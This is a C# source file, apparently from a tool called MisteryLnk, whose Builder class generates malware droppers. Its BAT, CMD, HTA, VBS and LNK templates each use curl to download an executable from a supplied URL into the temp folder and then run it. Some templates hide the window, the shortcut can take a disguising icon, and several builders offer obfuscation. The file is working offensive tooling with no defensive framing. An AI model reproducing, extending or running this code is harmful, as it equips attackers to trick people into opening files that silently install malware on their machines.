using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using File = System.IO.File;

namespace MisteryLnk.Algorithms
{
    internal class Builder
    {
        #region BatBuilder
        public static void BatBuilder(string url, string DropMethod, bool obfuscate)
        {
            string fileName = RandomFileName("exe");
            string template = $@"
@echo off
cd %temp%
curl -o {fileName} {url}
start {fileName}
";
            if (obfuscate)
            {
                template = Obfuscator.BatObfuscator(template);
            }
            SaveToFile(template, "BAT");
        }
        #endregion

        #region CmdBuilder
        public static void CmdBuilder(string url, string DropMethod, bool obfuscate)
        {
            string fileName = RandomFileName("exe");
            string template = $@"
@echo off
cd %temp%
curl -o {fileName} {url}
start {fileName}
";
            if (obfuscate)
            {
                template = Obfuscator.BatObfuscator(template);
            }
            SaveToFile(template, "CMD");
        }
        #endregion

        #region HtaBuilder
        public static void HtaBuilder(string url, string DropMethod)
        {
            string exeName = RandomFileName("exe");
            string cmdCommand = $"/c curl {url} -o %temp%\\{exeName} & start /b %temp%\\{exeName}";
            string template = $@"
<!DOCTYPE html>
<html>
<head>
<script>
var objShell = new ActiveXObject(""WScript.Shell"");
var command = ""cmd.exe {cmdCommand}"";
objShell.Run(command, 0, true);
window.close();
</script>
</head>
<body>
</body>
</html>
";
/*            if (obfuscate)
            {
                template = Obfuscator.HTAObfuscator(template);
            }*/
            SaveToFile(template, "HTA");
        }
        #endregion

        #region VbsBuilder
        public static void VbsBuilder(string url, string DropMethod, bool obfuscate)
        {
            string exeName = RandomFileName("exe");
            string cmdCommand = $"/c curl {url} -o %temp%\\{exeName} & start /b %temp%\\{exeName}";
            string vbscript = $@"
Set objShell = CreateObject(""WScript.Shell"")
command = ""cmd.exe {cmdCommand}""
objShell.Run command, 0, True
";
            if (obfuscate)
            {
                vbscript = Obfuscator.VBSObfuscator(vbscript);
            }
            SaveToFile(vbscript, "VBS");
        }
        #endregion

        #region LnkBuilder
        public static void LnkBuilder(string url, string DropMethod, string IconFile)
        {
            // Generate a random file name for the downloaded executable
            string exeName = RandomFileName("exe");
            // Prompt the user to select a location to save the .lnk file
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "Shortcut (*.lnk)|*.lnk",
                Title = "Save Shortcut"
            };

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string shortcutPath = saveFileDialog.FileName;

                try
                {
                    WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
                    shortcut.TargetPath = "cmd.exe";
                    shortcut.Arguments = $"/c mode 15,1 & curl {url} -o %temp%\\{exeName} & start /b %temp%\\{exeName}";
                    
                    shortcut.WindowStyle = 7; // Minimized window
                    if (IconFile != null) { shortcut.IconLocation = IconFile; }
                    
                    shortcut.Save();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred while creating the shortcut: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("File path is empty!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        #endregion

        #region Helper Functions
        private static void SaveToFile(string content, string extension)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = $"{extension} files (*.{extension.ToLower()})|*.{extension.ToLower()}|All files (*.*)|*.*";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, content);
                }
            }
        }

        private static string RandomFileName(string extension)
        {
            string fileName = Path.GetRandomFileName();
            return Path.ChangeExtension(fileName, extension);
        }
        #endregion
    }
}
